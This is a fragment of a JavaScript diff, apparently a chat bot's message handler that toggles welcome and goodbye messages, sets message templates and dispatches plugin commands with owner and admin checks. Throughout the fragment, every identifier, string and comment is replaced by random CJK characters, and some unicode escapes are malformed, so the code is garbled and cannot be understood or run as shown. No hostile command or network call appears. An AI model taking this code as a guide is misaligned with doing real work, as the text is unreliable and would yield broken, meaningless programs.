+      if (!_熾惪裹則鯕._囟店崝晫從._屎覕虨燨蟖 && _熾惪裹則鯕._囟店崝晫從._趋韃限錺綗裢 !== '_\u5b03\u66a2\u604f\u8a54\u7d91\u8fed@_\u8285\u724a\u9e90\u9cd2\u5845\u67bc\u8e90') {
+        _憘竒燦灃鍦殻觗.set(_熾惪裹則鯕._囟店崝晫從._巳醯堺厍, _熾惪裹則鯕);
+        if (_憘竒燦灃鍦殻觗._蹱镅锲唥枹 > 500) {
+          const _诡攷鬴抁贀溜 = _憘竒燦灃鍦殻觗._魧鶝虨詣洓存鉐()._玸犤虣厒()._薇楥渆洢竧;
+          _憘竒燦灃鍦殻觗.delete(_诡攷鬴抁贀溜);
+        }
+      }
+      
+      // _淇娎兗釈鱴釈 _蝛煽錛懰鍫鏕
+      if (_揙譠疵崿乼檁覎) {
+        _樞劈帳溤._肶譊蓟繂櫅(`\u1f50d _\u5503\u6459\u99e0\u77b4\u836e\u9f93\u892e: ${_\u875b\u717d\u931b\u61f0\u936b\u93d5} from ${_\u6e7b\u9cb4\u6c3c\u5e8d\u855f\u85f7\u8c38} (${_\u6281\u960b\u9056\u75f3\u8fc4\u7404})`);
+      }
+      
+      // ============ _孴摕靪亷氌鞔淫 _壿穏愕裐霵窈聩 ============
+      if (_骭嶼栁赥佅._孴摕靪亷氌鞔淫 === '_\u741d\u552d\u6629\u6b47' && _揙譠疵崿乼檁覎 && !_筥鍥涆倎蛎蜙) {
+        return;
+      }
+      
+      // ============ _幄趜蘡槻 _橈箎阮皀鬫 ============
+      if (_骭嶼栁赥佅._琽帀僓噲趑穣 === 'true' && !_揙譠疵崿乼檁覎 && !_熾惪裹則鯕._囟店崝晫從._屎覕虨燨蟖 && !_嫚塹锐迏) {
+        const _路焼辷騪逎塒荔 = _娉蚕屽溹[_鵩溴匛孄._铽顺氎榰蝉(_鵩溴匛孄._爼材襫姩暓婗() * _娉蚕屽溹._膻踌俅枓儽飲)];
+        await _啊仳痉偏羍輋._椛抄葴诇瓙丏傘(_路焼辷騪逎塒荔).catch(() => {});
+      }
+      
+      // ============ _阱鬅鄘橙鵋陡嵅 _軥瘗厶崇 ============
+      if (_骭嶼栁赥佅._鵣涨铊俭韨 === 'true' && !_熾惪裹則鯕._囟店崝晫從._屎覕虨燨蟖) {
+        await _壏其蓙龸恆腅饃._驹鈼蜅孊终栫('_\u591a\u53c0\u5908\u536e\u5cc3\u795b\u9678', from).catch(() => {});
+      }
+      
+      if (_骭嶼栁赥佅._縘荱掽穣 === 'true') {
+        await _壏其蓙龸恆腅饃._驹鈼蜅孊终栫('_\u6a82\u8d50\u5123\u9b0c\u9996').catch(() => {});
+      }
+      
+      if (_骭嶼栁赥佅._害剌硔餌傘壾 === 'true' && !_熾惪裹則鯕._囟店崝晫從._屎覕虨燨蟖) {
+        await _壏其蓙龸恆腅饃._擅璮逝簓铑熤夺([_熾惪裹則鯕._囟店崝晫從]).catch(() => {});
+      }
+      
+      // ============ _垊搼蓔埓詞崁樱/_襡猻膔蒬砍碇 _褎龣定綕鉗踢犓 ============
+      if (_揙譠疵崿乼檁覎 && _嫚塹锐迏) {
+        
+        // _垊搼蓔埓詞崁樱 _奧蓝胙隟/_窉爾淣露勉
+        if (_蝛煽錛懰鍫鏕 === '_\u6dea\u564a\u87d7\u546c\u53e2\u724f\u62bc') {
+          if (!_复誣跇殈價鸟 && !_筥鍥涆倎蛎蜙) {
+            return _躙褮僥濃墧鋫('\u274c _\u740b\u74c7\u8b71\u658c\u5636\u5331 _\u5d16\u9e44\u894f\u92a0\u9beb\u8910 _\u76c8\u94e3\u8c63\u9008\u54cb\u4f08\u92ab _\u76d8\u6a90\u9713\u5d37 this _\u875b\u717d\u931b\u61f0\u936b\u93d5!');
+          }
+          
+          const _釲哚驕賁箮 = _魾崟坤乛嫡跮徚[0]?._陘减柪搨擔鹨();
+          
+          if (_釲哚驕賁箮 === '_\u9599\u76a5\u90dc\u5f48') {
+            _瘥坵譋籢誌._淪噊蟗呬叢牏押 = true;
+            _礎朸鍄聾.set(from, _瘥坵譋籢誌);
+            _泐堂撶绑藹炣();
+            _躙褮僥濃墧鋫('\u2705 _\u7aea\u7212\u55b2\u4f68\u7d30\u6409\u7c26 _\u8cc9\u91cb\u5e13\u73da\u6b10\u8df0\u9720 _\u6af0\u5789\u6573\u885c _\u66c7\u9b2f\u80d8\u70de\u5e02\u7436 _\u86da\u7592\u6d2e\u9978\u7987\u9dc3\u7207 _\u5967\u84dd\u80d9\u969f for this _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974!');
+          } else if (_釲哚驕賁箮 === '_\u923e\u5002\u60e8\u6e16\u5895') {
+            _瘥坵譋籢誌._淪噊蟗呬叢牏押 = false;
+            _礎朸鍄聾.set(from, _瘥坵譋籢誌);
+            _泐堂撶绑藹炣();
+            _躙褮僥濃墧鋫('\u2705 _\u7aea\u7212\u55b2\u4f68\u7d30\u6409\u7c26 _\u8cc9\u91cb\u5e13\u73da\u6b10\u8df0\u9720 _\u6af0\u5789\u6573\u885c _\u66c7\u9b2f\u80d8\u70de\u5e02\u7436 _\u86da\u7592\u6d2e\u9978\u7987\u9dc3\u7207 _\u7a89\u723e\u6de3\u9732\u52c9 for this _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974!');
+          } else {
+            _躙褮僥濃墧鋫(`_\u7aea\u7212\u55b2\u4f68\u7d30\u6409\u7c26 _\u8cc9\u91cb\u5e13\u73da\u6b10\u8df0\u9720 _\u5f89\u6f86\u5995\u5fa3 _\u5a39\u7042\u68d2\u6194\u98e1: ${_\u7625\u5775\u8b4b\u7c62\u8a8c._\u6dea\u564a\u87d7\u546c\u53e2\u724f\u62bc ? '_\u5967\u84dd\u80d9\u969f' : '_\u7a89\u723e\u6de3\u9732\u52c9'}\_\u51b0\u51d4\u58e6\u60f2\_\u574f\u6269\u9954\u660d\u8ca6\u927f:\_\u51b0\u51d4\u58e6\u60f2._\u6dea\u564a\u87d7\u546c\u53e2\u724f\u62bc _\u9599\u76a5\u90dc\u5f48 - _\u95bc\u9804\u6976\u706d\u5d0d\u9813\u60b1 _\u5967\u84dd\u80d9\u969f\_\u51b0\u51d4\u58e6\u60f2._\u6dea\u564a\u87d7\u546c\u53e2\u724f\u62bc _\u923e\u5002\u60e8\u6e16\u5895 - _\u95bc\u9804\u6976\u706d\u5d0d\u9813\u60b1 _\u7a89\u723e\u6de3\u9732\u52c9`);
+          }
+        }
+        
+        // _襡猻膔蒬砍碇 _奧蓝胙隟/_窉爾淣露勉
+        else if (_蝛煽錛懰鍫鏕 === '_\u8829\u6d34\u653b\u6026\u6812\u8851\u55e1') {
+          if (!_复誣跇殈價鸟 && !_筥鍥涆倎蛎蜙) {
+            return _躙褮僥濃墧鋫('\u274c _\u740b\u74c7\u8b71\u658c\u5636\u5331 _\u5d16\u9e44\u894f\u92a0\u9beb\u8910 _\u76c8\u94e3\u8c63\u9008\u54cb\u4f08\u92ab _\u76d8\u6a90\u9713\u5d37 this _\u875b\u717d\u931b\u61f0\u936b\u93d5!');
+          }
+          
+          const _釲哚驕賁箮 = _魾崟坤乛嫡跮徚[0]?._陘减柪搨擔鹨();
+          
+          if (_釲哚驕賁箮 === '_\u9599\u76a5\u90dc\u5f48') {
+            _瘥坵譋籢誌._蠩洴攻怦栒衑嗡 = true;
+            _礎朸鍄聾.set(from, _瘥坵譋籢誌);
+            _泐堂撶绑藹炣();
+            _躙褮僥濃墧鋫('\u2705 _\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa _\u8cc9\u91cb\u5e13\u73da\u6b10\u8df0\u9720 _\u6af0\u5789\u6573\u885c _\u66c7\u9b2f\u80d8\u70de\u5e02\u7436 _\u86da\u7592\u6d2e\u9978\u7987\u9dc3\u7207 _\u5967\u84dd\u80d9\u969f for this _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974!');
+          } else if (_釲哚驕賁箮 === '_\u923e\u5002\u60e8\u6e16\u5895') {
+            _瘥坵譋籢誌._蠩洴攻怦栒衑嗡 = false;
+            _礎朸鍄聾.set(from, _瘥坵譋籢誌);
+            _泐堂撶绑藹炣();
+            _躙褮僥濃墧鋫('\u2705 _\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa _\u8cc9\u91cb\u5e13\u73da\u6b10\u8df0\u9720 _\u6af0\u5789\u6573\u885c _\u66c7\u9b2f\u80d8\u70de\u5e02\u7436 _\u86da\u7592\u6d2e\u9978\u7987\u9dc3\u7207 _\u7a89\u723e\u6de3\u9732\u52c9 for this _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974!');
+          } else {
+            _躙褮僥濃墧鋫(`_\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa _\u8cc9\u91cb\u5e13\u73da\u6b10\u8df0\u9720 _\u5f89\u6f86\u5995\u5fa3 _\u5a39\u7042\u68d2\u6194\u98e1: ${_\u7625\u5775\u8b4b\u7c62\u8a8c._\u8829\u6d34\u653b\u6026\u6812\u8851\u55e1 ? '_\u5967\u84dd\u80d9\u969f' : '_\u7a89\u723e\u6de3\u9732\u52c9'}\_\u51b0\u51d4\u58e6\u60f2\_\u574f\u6269\u9954\u660d\u8ca6\u927f:\_\u51b0\u51d4\u58e6\u60f2._\u8829\u6d34\u653b\u6026\u6812\u8851\u55e1 _\u9599\u76a5\u90dc\u5f48 - _\u95bc\u9804\u6976\u706d\u5d0d\u9813\u60b1 _\u5967\u84dd\u80d9\u969f\_\u51b0\u51d4\u58e6\u60f2._\u8829\u6d34\u653b\u6026\u6812\u8851\u55e1 _\u923e\u5002\u60e8\u6e16\u5895 - _\u95bc\u9804\u6976\u706d\u5d0d\u9813\u60b1 _\u7a89\u723e\u6de3\u9732\u52c9`);
+          }
+        }
+        
+        // _喎耼舲檢 _垊搼蓔埓詞崁樱 _梜噿歐偲醒
+        else if (_蝛煽錛懰鍫鏕 === '_\u6ef8\u7e54\u8f68\u8d85\u7bc3') {
+          if (!_复誣跇殈價鸟 && !_筥鍥涆倎蛎蜙) {
+            return _躙褮僥濃墧鋫('\u274c _\u740b\u74c7\u8b71\u658c\u5636\u5331 _\u5d16\u9e44\u894f\u92a0\u9beb\u8910 _\u76c8\u94e3\u8c63\u9008\u54cb\u4f08\u92ab _\u76d8\u6a90\u9713\u5d37 this _\u875b\u717d\u931b\u61f0\u936b\u93d5!');
+          }
+          
+          if (!_堈鷻懳椵) {
+            return _躙褮僥濃墧鋫(`\u274c _\u7917\u91e3\u6bed\u61d1\u6261\u9114 _\u9c51\u9f0a\u7be6\u5793\u6dca\u6b45\u9064 _\u6132\u8be1\u6254\u8bf9\u9233 _\u6dea\u564a\u87d7\u546c\u53e2\u724f\u62bc _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039!\_\u51b0\u51d4\u58e6\u60f2\_\u6ffa\u75c3\u58e8\u7f07 _\u6f55\u6ece\u6d03\u8d54\u6785:\_\u51b0\u51d4\u58e6\u60f2@_\u67a9\u69da\u952f\u76f1\u9453\u6886 - _\u85d2\u808c\u8dc0\u59ad\u5bd5 _\u67a9\u69da\u952f\u76f1\u9453\u6886\_\u51b0\u51d4\u58e6\u60f2@_\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974 - _\u5670\u871b\u768b\u8c53\u6fd5 _\u9dcb\u59ee\u829d\u8251\u7f72\u612d\_\u51b0\u51d4\u58e6\u60f2@_\u8c47\u9a5c\u8378\u8237\u787b - _\u7f57\u6a87\u8971\u8ed8\u6bfe\u875f\u8562 _\u8c47\u9a5c\u8378\u8237\u787b\_\u51b0\u51d4\u58e6\u60f2@_\u84d4\u8678\u6510\u8072\u9601\u6b9e\u7d24 - _\u5670\u871b\u768b\u8c53\u6fd5 _\u8253\u869f\u655a\u8838\u4e12\_\u51b0\u51d4\u58e6\u60f2\_\u8ae6\u8403\u5da1\u4f1d:\_\u51b0\u51d4\u58e6\u60f2._\u6ef8\u7e54\u8f68\u8d85\u7bc3 _\u9cd3\u51b9\u8c6b\u8cf5\u8926 @_\u67a9\u69da\u952f\u76f1\u9453\u6886! _\u7aea\u7212\u55b2\u4f68\u7d30\u6409\u7c26 _\u5416\u96a6\u5527\u65a3\u8776 @_\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974`);
+          }
+          
+          _瘥坵譋籢誌._贜熄闌尅 = _堈鷻懳椵;
+          _礎朸鍄聾.set(from, _瘥坵譋籢誌);
+          _泐堂撶绑藹炣();
+          _躙褮僥濃墧鋫('\u2705 _\u7aea\u7212\u55b2\u4f68\u7d30\u6409\u7c26 _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u91f3\u86d6\u9ed8\u658f\u6b6f\u550e _\u66c7\u9b2f\u80d8\u70de\u5e02\u7436 _\u9e49\u7e51\u7173\u8963\u60f9\u6a6a\u618d!\_\u51b0\u51d4\u58e6\u60f2\_\u97fb\u6891\u9190\u9c0b:\_\u51b0\u51d4\u58e6\u60f2' + _堈鷻懳椵._寢梕变轄熔龥鱦(/@_枩槚锯盱鑓梆/_跒詄鄅酬, '@_\u67a9\u69da\u952f\u76f1\u9453\u6886')._寢梕变轄熔龥鱦(/@_用欢蛀奃銲鴷襴/_跒詄鄅酬, _邔艮澰褶)._寢梕变轄熔龥鱦(/@_豇驜荸舷硻/_跒詄鄅酬, _买烏襗徺僔._膻踌俅枓儽飲));
+        }
+        
+        // _喎耼舲檢 _襡猻膔蒬砍碇 _梜噿歐偲醒
+        else if (_蝛煽錛懰鍫鏕 === '_\u9b13\u8477\u4e5b\u505f\u6f5f') {
+          if (!_复誣跇殈價鸟 && !_筥鍥涆倎蛎蜙) {
+            return _躙褮僥濃墧鋫('\u274c _\u740b\u74c7\u8b71\u658c\u5636\u5331 _\u5d16\u9e44\u894f\u92a0\u9beb\u8910 _\u76c8\u94e3\u8c63\u9008\u54cb\u4f08\u92ab _\u76d8\u6a90\u9713\u5d37 this _\u875b\u717d\u931b\u61f0\u936b\u93d5!');
+          }
+          
+          if (!_堈鷻懳椵) {
+            return _躙褮僥濃墧鋫(`\u274c _\u7917\u91e3\u6bed\u61d1\u6261\u9114 _\u9c51\u9f0a\u7be6\u5793\u6dca\u6b45\u9064 _\u6132\u8be1\u6254\u8bf9\u9233 _\u8829\u6d34\u653b\u6026\u6812\u8851\u55e1 _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039!\_\u51b0\u51d4\u58e6\u60f2\_\u6ffa\u75c3\u58e8\u7f07 _\u6f55\u6ece\u6d03\u8d54\u6785:\_\u51b0\u51d4\u58e6\u60f2@_\u67a9\u69da\u952f\u76f1\u9453\u6886 - _\u85d2\u808c\u8dc0\u59ad\u5bd5 _\u67a9\u69da\u952f\u76f1\u9453\u6886\_\u51b0\u51d4\u58e6\u60f2@_\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974 - _\u5670\u871b\u768b\u8c53\u6fd5 _\u9dcb\u59ee\u829d\u8251\u7f72\u612d\_\u51b0\u51d4\u58e6\u60f2@_\u8c47\u9a5c\u8378\u8237\u787b - _\u7f57\u6a87\u8971\u8ed8\u6bfe\u875f\u8562 _\u8c47\u9a5c\u8378\u8237\u787b\_\u51b0\u51d4\u58e6\u60f2\_\u8ae6\u8403\u5da1\u4f1d:\_\u51b0\u51d4\u58e6\u60f2._\u9b13\u8477\u4e5b\u505f\u6f5f _\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa @_\u67a9\u69da\u952f\u76f1\u9453\u6886! _\u699d\u4ee9\u554d\u5115\u845b'_\u7689\u6c0d\u6404\u787e\u817e\u7d3a _\u78b9\u8bbe\u68f4\u54fe\u6c37\u6ff7\u9106 _\u9766\u53af\u75c2\u6573 in @_\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974`);
+          }
+          
+          _瘥坵譋籢誌._簬紁賃牧觊 = _堈鷻懳椵;
+          _礎朸鍄聾.set(from, _瘥坵譋籢誌);
+          _泐堂撶绑藹炣();
+          _躙褮僥濃墧鋫('\u2705 _\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u91f3\u86d6\u9ed8\u658f\u6b6f\u550e _\u66c7\u9b2f\u80d8\u70de\u5e02\u7436 _\u9e49\u7e51\u7173\u8963\u60f9\u6a6a\u618d!\_\u51b0\u51d4\u58e6\u60f2\_\u97fb\u6891\u9190\u9c0b:\_\u51b0\u51d4\u58e6\u60f2' + _堈鷻懳椵._寢梕变轄熔龥鱦(/@_枩槚锯盱鑓梆/_跒詄鄅酬, '@_\u67a9\u69da\u952f\u76f1\u9453\u6886')._寢梕变轄熔龥鱦(/@_用欢蛀奃銲鴷襴/_跒詄鄅酬, _邔艮澰褶)._寢梕变轄熔龥鱦(/@_豇驜荸舷硻/_跒詄鄅酬, _买烏襗徺僔._膻踌俅枓儽飲));
+        }
+        
+        // _崥濞甚仲繡絣 _垊搼蓔埓詞崁樱
+        else if (_蝛煽錛懰鍫鏕 === '_\u5302\u71aa\u55b7\u97b2\u95cb\u95d2\u985e') {
+          if (!_复誣跇殈價鸟 && !_筥鍥涆倎蛎蜙) {
+            return _躙褮僥濃墧鋫('\u274c _\u740b\u74c7\u8b71\u658c\u5636\u5331 _\u5d16\u9e44\u894f\u92a0\u9beb\u8910 _\u76c8\u94e3\u8c63\u9008\u54cb\u4f08\u92ab _\u76d8\u6a90\u9713\u5d37 this _\u875b\u717d\u931b\u61f0\u936b\u93d5!');
+          }
+          
+          _瘥坵譋籢誌._贜熄闌尅 = _婊鬆傌乬喝盕;
+          _礎朸鍄聾.set(from, _瘥坵譋籢誌);
+          _泐堂撶绑藹炣();
+          _躙褮僥濃墧鋫('\u2705 _\u7aea\u7212\u55b2\u4f68\u7d30\u6409\u7c26 _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u91f3\u86d6\u9ed8\u658f\u6b6f\u550e _\u66c7\u9b2f\u80d8\u70de\u5e02\u7436 _\u779e\u6eb4\u8a72\u787a _\u5416\u96a6\u5527\u65a3\u8776 default!');
+        }
+        
+        // _崥濞甚仲繡絣 _襡猻膔蒬砍碇
+        else if (_蝛煽錛懰鍫鏕 === '_\u6ea1\u5256\u82e6\u70f7\u90d0') {
+          if (!_复誣跇殈價鸟 && !_筥鍥涆倎蛎蜙) {
+            return _躙褮僥濃墧鋫('\u274c _\u740b\u74c7\u8b71\u658c\u5636\u5331 _\u5d16\u9e44\u894f\u92a0\u9beb\u8910 _\u76c8\u94e3\u8c63\u9008\u54cb\u4f08\u92ab _\u76d8\u6a90\u9713\u5d37 this _\u875b\u717d\u931b\u61f0\u936b\u93d5!');
+          }
+          
+          _瘥坵譋籢誌._簬紁賃牧觊 = _瘄澻稬撀臐;
+          _礎朸鍄聾.set(from, _瘥坵譋籢誌);
+          _泐堂撶绑藹炣();
+          _躙褮僥濃墧鋫('\u2705 _\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa _\u99d1\u5f95\u5e2b\u51d9\u6837\u9039 _\u91f3\u86d6\u9ed8\u658f\u6b6f\u550e _\u66c7\u9b2f\u80d8\u70de\u5e02\u7436 _\u779e\u6eb4\u8a72\u787a _\u5416\u96a6\u5527\u65a3\u8776 default!');
+        }
+        
+        // _轣嘴羣墉枢荺 _垊搼蓔埓詞崁樱 _圖祬跢摦台穃瓏
+        else if (_蝛煽錛懰鍫鏕 === '_\u70f9\u9712\u4e46\u503f' || _蝛煽錛懰鍫鏕 === '_\u7a8d\u85e3\u895a\u8655\u616d') {
+          if (!_复誣跇殈價鸟 && !_筥鍥涆倎蛎蜙) {
+            return _躙褮僥濃墧鋫('\u274c _\u740b\u74c7\u8b71\u658c\u5636\u5331 _\u5d16\u9e44\u894f\u92a0\u9beb\u8910 _\u76c8\u94e3\u8c63\u9008\u54cb\u4f08\u92ab _\u76d8\u6a90\u9713\u5d37 this _\u875b\u717d\u931b\u61f0\u936b\u93d5!');
+          }
+          
+          const _戁木嫙羠剂鍤 = `\u256d\u2500\u2500\u274d *_\u578a\u643c\u84d4\u57d3\u8a5e\u5d01\u6a31 _\u5716\u796c\u8de2\u6466\u53f0\u7a43\u74cf* \u29fd\u2500\u2500\u2500\u274d\u000a\u2502\u2503\u27b3 *_\u569e\u51ff\u8b2c\u8206:* ${_\u7625\u5775\u8b4b\u7c62\u8a8c._\u6dea\u564a\u87d7\u546c\u53e2\u724f\u62bc ? '\u2705 _\u5967\u84dd\u80d9\u969f' : '\u274c _\u7a89\u723e\u6de3\u9732\u52c9'}\u000a\u2502\u2503\u27b3 *_\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa:* ${_\u7625\u5775\u8b4b\u7c62\u8a8c._\u8829\u6d34\u653b\u6026\u6812\u8851\u55e1 ? '\u2705 _\u5967\u84dd\u80d9\u969f' : '\u274c _\u7a89\u723e\u6de3\u9732\u52c9'}\u000a\u2502\u000a\u2502\u2503\u27b3 *_\u7aea\u7212\u55b2\u4f68\u7d30\u6409\u7c26 _\u4e8b\u84ea\u54b0\u87c3:*\u000a\u2502\u2503\u27b3 ${_\u7625\u5775\u8b4b\u7c62\u8a8c._\u8d1c\u7184\u95cc\u5c05._\u8b85\u81ce\u5c4d\u8d33(0, 50)}...\u000a\u2502\u000a\u2502\u2503\u27b3 *_\u895d\u77bc\u676c\u7ab0\u97fb\u9bfa _\u4e8b\u84ea\u54b0\u87c3:*\u000a\u2502\u2503\u27b3 ${_\u7625\u5775\u8b4b\u7c62\u8a8c._\u7c2c\u7d01\u8cc3\u7267\u89ca._\u8b85\u81ce\u5c4d\u8d33(0, 50)}...\u000a\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u274d\u000a\u000a_\u5c81\u7ff9\u89b0\u818a\u6bae\u7191\u8ecd:\u000a._\u6dea\u564a\u87d7\u546c\u53e2\u724f\u62bc _\u9599\u76a5\u90dc\u5f48/_\u923e\u5002\u60e8\u6e16\u5895\u000a._\u8829\u6d34\u653b\u6026\u6812\u8851\u55e1 _\u9599\u76a5\u90dc\u5f48/_\u923e\u5002\u60e8\u6e16\u5895\u000a._\u6ef8\u7e54\u8f68\u8d85\u7bc3 <_\u775c\u55c9\u68a0\u5320\u5536\u9b50>\u000a._\u9b13\u8477\u4e5b\u505f\u6f5f <_\u775c\u55c9\u68a0\u5320\u5536\u9b50>\u000a._\u5302\u71aa\u55b7\u97b2\u95cb\u95d2\u985e\u000a._\u6ea1\u5256\u82e6\u70f7\u90d0`;
+          
+          _躙褮僥濃墧鋫(_戁木嫙羠剂鍤);
+        }
+      }
+      
+      // ============ _幵裷凪促 _憊號資擖儲 (for _庽訐掙绡瑱惱 _铅掲頿姮厴薌) ============
+      const _穬咨苁澓瑛捍璔 = './_\u5478\u8917\u5001\u90f0/_\u875b\u717d\u931b\u61f0\u936b\u93d5';
+      if (_蠕坖厃嬴榏朅._踩炆繝渥矓颼辭(_穬咨苁澓瑛捍璔 + '._\u8a1c\u810f\u8692\u8bb6')) {
+        const _铅掲頿姮厴薌 = _畯卉惷垉厁蘊儑(_穬咨苁澓瑛捍璔);
+        
+        if (_铅掲頿姮厴薌._铅掲頿姮厴薌 && _闃倂姎綈._測礛腽邅夹(_铅掲頿姮厴薌._铅掲頿姮厴薌)) {
+          
+          // _曺癵隒燝洭苴 _氚礴蔛牺匪婹 _铅掲頿姮厴薌 (_焯駈絙承惒锠跬 _淪噊蟗呬叢牏押/_蠩洴攻怦栒衑嗡 _铅掲頿姮厴薌 _魔霥針柗筝爛存 _癇营嬝琦 _錯鲠淐叭遇 _当貉骾纡獥蝋 _刏甡猷醯塨遻砂)
+          if (_揙譠疵崿乼檁覎 && !['_\u6dea\u564a\u87d7\u546c\u53e2\u724f\u62bc', '_\u8829\u6d34\u653b\u6026\u6812\u8851\u55e1', '_\u6ef8\u7e54\u8f68\u8d85\u7bc3', '_\u9b13\u8477\u4e5b\u505f\u6f5f', '_\u5302\u71aa\u55b7\u97b2\u95cb\u95d2\u985e', '_\u6ea1\u5256\u82e6\u70f7\u90d0', '_\u70f9\u9712\u4e46\u503f', '_\u7a8d\u85e3\u895a\u8655\u616d']._鹏兼衖穴(_蝛煽錛懰鍫鏕)) {
+            const _肁筟飖芪 = _铅掲頿姮厴薌._铅掲頿姮厴薌._蒑鯘澟驃洌(_禱龃骁畮齻僐 => _禱龃骁畮齻僐._磠訿堸懭獷褗朙 === _蝛煽錛懰鍫鏕) || 
+                             _铅掲頿姮厴薌._铅掲頿姮厴薌._蒑鯘澟驃洌(_禱龃骁畮齻僐 => _禱龃骁畮齻僐._龕線羕梬 && _禱龃骁畮齻僐._龕線羕梬._鹏兼衖穴(_蝛煽錛懰鍫鏕));
+            
+            if (_肁筟飖芪) {
+              
+              // _嫅鮳凛裏捠盏 _踳穕衴耞惈
+              if (_肁筟飖芪._百瘳竐搰函蟿 === '_\u6ac7\u738c\u5385\u622f\u4f10' && !_筥鍥涆倎蛎蜙) {
+                return _躙褮僥濃墧鋫('\u274c _\u6e8a\u8a3d\u9383\u6ba3\u5a39\u8ac1\u57c6 _\u875b\u717d\u931b\u61f0\u936b\u93d5 _\u728d\u841a\u7b47\u7d8d _\u6b57\u75c3\u70ee\u53cd\u8c78 for _\u88a8\u71d5\u9e9f\u7b99\u6b97\u91cc _\u6ac7\u738c\u5385\u622f\u4f10!');
+              }
+              
+              if (_肁筟飖芪._百瘳竐搰函蟿 === '_\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974' && !_嫚塹锐迏) {
+                return _躙褮僥濃墧鋫('\u274c _\u6e8a\u8a3d\u9383\u6ba3\u5a39\u8ac1\u57c6 _\u875b\u717d\u931b\u61f0\u936b\u93d5 _\u76c8\u94e3\u8c63\u9008\u54cb\u4f08\u92ab _\u6b57\u75c3\u70ee\u53cd\u8c78 _\u6b3b\u9925\u88c2\u6324 _\u5c07\u7dc7\u7842\u823a\u5171 in _\u9fe9\u6517\u523a\u8a5b\u9473\u81ca!');
+              }
+              
+              if (_肁筟飖芪._百瘳竐搰函蟿 === '_\u8357\u8e48\u513b\u92f6\u8ac2\u87b3\u70ac' && !_复誣跇殈價鸟 && !_筥鍥涆倎蛎蜙) {
+                return _躙褮僥濃墧鋫('\u274c _\u6e8a\u8a3d\u9383\u6ba3\u5a39\u8ac1\u57c6 _\u875b\u717d\u931b\u61f0\u936b\u93d5 _\u728d\u841a\u7b47\u7d8d _\u6b57\u75c3\u70ee\u53cd\u8c78 for _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974 _\u5d16\u9e44\u894f\u92a0\u9beb\u8910!');
+              }
+              
+              // _嫅鮳凛裏捠盏 if _蝛煽錛懰鍫鏕 _犍萚筇綍 _踧泪櫊泎虫龘岔 for _用欢蛀奃銲鴷襴
+              if (_肁筟飖芪._磠訿堸懭獷褗朙 === '_\u53e3\u65bc\u7fc5\u5fa6\u7089\u804d' && _瘥坵譋籢誌._口於翅徦炉聍 === false) {
+                return _躙褮僥濃墧鋫('\u274c _\u7913\u790c\u78b5\u90c7\u76a2\u648a\u9873-_\u6267\u8d41\u787e\u7ebb\u72c6\u72c8\u9072 _\u728d\u841a\u7b47\u7d8d _\u7f99\u97d3\u5249\u90de in this _\u7528\u6b22\u86c0\u5943\u92b2\u9d37\u8974!');
+              }
+              
+              // _圩餗層鼶樝 if _嚸残畅狡勰焯
+              if (_肁筟飖芪._椛抄葴诇瓙丏傘) {
+                await _壏其蓙龸恆腅饃._菀暸鉎軔糊犰(from, { 
+                  _椛抄葴诇瓙丏傘: { _睜嗉梠匠唶魐: _肁筟飖芪._椛抄葴诇瓙丏傘, _囟店崝晫從: _熾惪裹則鯕._囟店崝晫從 } 
+                }).catch(() => {});
+              }
+              
+              // _鳆搝彋赻鳃镉嫃 _蝛煽錛懰鍫鏕
+              try {
+                await _肁筟飖芪.function(_壏其蓙龸恆腅饃, _熾惪裹則鯕, _啊仳痉偏羍輋, {
+                  from, _躙褮僥濃墧鋫, _鹫錨腱婛嫮髬帔, _揙譠疵崿乼檁覎, _蝛煽錛懰鍫鏕: _肁筟飖芪,
+                  _魾崟坤乛嫡跮徚, _堈鷻懳椵, _嫚塹锐迏, _稓痾塅陟榖, _抁阋遖痳迄琄, _鉨糪靌毪蟟匕歇,
+                  _絈艾屒汄: _湻鲴氼庍蕟藷谸, _仏轡勗蔸, _筥鍥涆倎蛎蜙, _艊鸓妍轹栄鈎襪,
+                  _邔艮澰褶, _买烏襗徺僔, _跘騎牔屓, _懷痬葪崩鑃, _复誣跇殈價鸟,
+                  _浲骃銁黵刲, _戟沁诂聵钂鶝寈, _坐萑岮厐樤槚, _氚礴蔛牺匪婹, _鍵庬鲕橿, _讠鑵砛枻敩, _忈頴损雊冮噉,
+                  _礎朸鍄聾: _瘥坵譋籢誌
+                });
+                _樞劈帳溤._肶譊蓟繂櫅(`\u2705 _\u5503\u6459\u99e0\u77b4\u836e\u9f93\u892e _\u8537\u94b5\u86ae\u5151\u5c67: ${_\u875b\u717d\u931b\u61f0\u936b\u93d5}`);
+              } catch (_弙鉼蝎肮) {
+                _樞劈帳溤._羬龎拡鈥騑(`\u274c _\u5503\u6459\u99e0\u77b4\u836e\u9f93\u892e _\u7fac\u9f8e\u62e1\u9225\u9a11:`, _弙鉼蝎肮);
+                _躙褮僥濃墧鋫(`\u274c _\u8796\u883d\u57d3\u6b81\u71d2\u65ff\u9445: ${_\u5f19\u927c\u874e\u80ae._\u99d1\u5f95\u5e2b\u51d9\u6837\u9039}`);
+              }
+            }
+          }
+          
